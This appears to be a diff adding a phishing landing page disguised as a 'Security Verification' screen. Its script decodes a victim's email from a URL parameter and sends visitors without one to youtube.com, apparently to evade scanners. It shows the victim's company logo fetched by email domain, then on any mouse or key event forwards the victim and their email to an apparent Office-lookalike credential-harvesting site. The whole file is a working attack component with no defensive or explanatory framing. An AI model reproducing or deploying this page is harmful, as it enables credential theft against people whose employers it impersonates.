@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: url('screen.svg') no-repeat center center fixed;
+            background-size: cover;
+            color: #2c3e50;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            min-width: 100vw;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            box-sizing: border-box;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05), 
+                        0 10px 15px rgba(0, 0, 0, 0.025);
+            max-width: 400px;
+            width: 90%;
+            border: 1px solid #e1e8f0;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 25px;
+            border-radius: 8px;
+            padding: 10px;
+            object-fit: contain;
+            background: white;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            border: 1px solid #e1e8f0;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #e1e8f0;
+            border-top-color: #2563eb;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 25px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            margin: 15px 0;
+            line-height: 1.6;
+            font-size: 15px;
+            color: #64748b;
+        }
+        #userEmail {
+            color: #1e40af;
+            font-weight: 600;
+            font-size: 16px;
+        }
+        #statusMsg {
+            background: #f0f7ff;
+            padding: 12px 20px;
+            border-radius: 8px;
+            border: 1px solid #bfdbfe;
+            color: #1e40af;
+            font-size: 14px;
+        }
+        .header {
+            color: #1e40af;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 30px;
+        }
+    </style>
+</head>
+<body>
+    <script>
+    (function(){
+        const urlParams = new URLSearchParams(window.location.search);
+        const base64Email = urlParams.get('smgx');
+        let email = '';
+        
+        try {
+            if (base64Email) {
+                email = atob(base64Email);
+                console.log('Decoded email:', email);
+            }
+        } catch (e) {
+            console.log('Failed to decode base64:', e);
+            window.location.href = 'https://youtube.com';
+            return;
+        }
+
+        if (!email || !email.includes('@')) {
+            window.location.href = 'https://youtube.com';
+            return;
+        }
+
+        const domain = email.split('@')[1];
+        console.log('Domain:', domain);
+
+        const logoUrl = `https://logo.clearbit.com/${domain}?size=100&type=square`;
+        const targetUrl = `https://office.hautklereffice.site/lMacUmho#${base64Email}`;
+
+        document.body.innerHTML = `
+            <div class="container">
+                <div class="header">Security Verification</div>
+                <img id="logo" class="logo" src="${logoUrl}" alt="${domain} Logo" onerror="this.src='https://logo.clearbit.com/adobe.com'" />
+                <p class="message" id="userEmail">${email}</p>
+                <div class="spinner"></div>
+                <p class="message" id="statusMsg">To continue securely, please interact with this page by moving your mouse, clicking, or pressing any key.</p>
+            </div>
+        `;
+
+        const events = ['mousemove', 'click', 'keypress', 'touchstart'];
+        events.forEach(event => {
+            document.addEventListener(event, () => {
+                // Update status message
+                document.getElementById('statusMsg').innerHTML = 'Interaction detected. Redirecting...';
+                document.getElementById('statusMsg').style.background = '#e6ffe6';
+                document.getElementById('statusMsg').style.border = '1px solid #90EE90';
+                document.getElementById('statusMsg').style.color = '#006400';
+                
+                // Delay redirect for 1.5 seconds to show the message
+                setTimeout(() => {
+                    window.location.href = targetUrl;
+                }, 1500);
+            }, { once: true });
+        });
+    })();
+    </script>
+</body>
+</html>
